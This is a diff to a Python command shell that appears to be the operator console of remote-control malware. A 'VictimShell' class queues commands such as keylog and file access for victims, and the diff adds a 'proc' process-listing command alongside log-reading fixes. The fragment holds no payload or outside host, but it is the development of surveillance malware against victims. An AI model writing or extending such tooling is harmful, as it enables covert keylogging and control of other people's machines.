@@ -23,11 +23,18 @@ class BaseShell(cmd.Cmd):
     
     # 로그 출력
     def _print_log(self, count=100):
-        with open(logger.handlers[0].baseFilename, 'r', encoding=ENCODING) as fr:
-            log_data = fr.readlines()
+        try:
+            with open(logger.handlers[0].baseFilename, 'r', encoding=ENCODING) as fr:
+                log_data = fr.readlines()
+        except:
+            try:
+                with open(logger.handlers[0].baseFilename, 'r', encoding=SUB_ENCODING) as fr:
+                    log_data = fr.readlines()
+            except:
+                self.stdout.write('log data decode error\n')
         
         if not log_data:
-            print('None')
+            self.stdout.write('None\n')
             return
 
         start_index = (len(log_data) - count) if (len(log_data) - count) > 0 else 0
@@ -35,7 +42,7 @@ class BaseShell(cmd.Cmd):
         log_data = log_data[start_index:]
 
         for data in log_data:
-            print(data, end='')
+            self.stdout.write(data)
 
     # argument parsing
     def _parsing_argu(self, arg : str):
@@ -190,6 +197,9 @@ class VictimShell(BaseShell, SEQFileMixin):
             # 피해자 키로그
             elif parsed_arg[0] == 'keylog':
                 self.victim_table['command'].append('[keylog]')
+                return
+            elif parsed_arg[0] == 'proc':
+                self.victim_table['command'].append('[proc]')
                 return
             elif parsed_arg[0] == 'file':
                 parsed_arg = parsed_arg[1:]
